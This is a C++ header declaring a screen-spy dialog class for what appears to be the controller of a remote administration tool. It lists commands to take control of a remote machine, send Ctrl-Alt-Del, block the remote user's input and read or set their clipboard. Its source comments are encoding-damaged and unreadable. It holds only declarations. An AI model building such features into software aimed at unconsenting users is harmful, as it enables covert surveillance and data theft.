#pragma once
#include"IOCPServer.h"

// CScreenSpyDlg �Ի���


enum
{
	IDM_CONTROL = 0x1010,
	IDM_SEND_CTRL_ALT_DEL,
	IDM_TRACE_CURSOR,	// ������ʾԶ�����
	IDM_BLOCK_INPUT,	// ����Զ�̼��������
	IDM_SAVEDIB,		// ����ͼƬ
	IDM_GET_CLIPBOARD,	// ��ȡ������
	IDM_SET_CLIPBOARD,	// ���ü�����
};
class CScreenSpyDlg : public CDialog
{
	DECLARE_DYNAMIC(CScreenSpyDlg)

public:
	CScreenSpyDlg(CWnd* pParent = NULL, IOCPServer* IOCPServer = NULL, CONTEXT_OBJECT *ContextObject = NULL);   // ��׼���캯��
	virtual ~CScreenSpyDlg();
	VOID SendNext();
	VOID OnReceiveComplete();
	VOID UpdateServerClipboard(char * szBuffer, ULONG ulLength);
	VOID DrawFirstScreen();
	VOID DrawTipString(CString strString);

	VOID DrawNextScreenDiff();
	BOOL SaveSnapshot();
	VOID SendCommand(MSG* Msg);

public:
	CONTEXT_OBJECT* m_ContextObject;
	IOCPServer* m_IocpServer;
	HDC m_FullDC;
	HDC m_hFullMemDC;
	HBITMAP m_BitmapHandle;
	PVOID m_BitmapData_Full;
	LPBITMAPINFO m_BitmapInfor_Full;
	BOOL m_bIsFirst;
	ULONG m_ulHScrollPos;
	ULONG m_ulVScrollPos;
	HICON m_hIcon;
	HICON m_hCursor;
	POINT m_ClientCursorPos;
	CString m_strClientIP;
	BOOL m_bIsTraceCursor;
	BOOL m_bIsCtrl;
	LPBYTE m_szData;
	BOOL m_bSend;
	ULONG m_ulMsgCount;

// �Ի�������
#ifdef AFX_DESIGN_TIME
	enum { IDD = IDD_DIALOG_SCREEN_SPY };
#endif

protected:
	VOID SendServerClipboard();
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV ֧��

	DECLARE_MESSAGE_MAP()
public:
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg void OnSysCommand(UINT nID, LPARAM lParam);
	virtual BOOL PreTranslateMessage(MSG* pMsg);
};


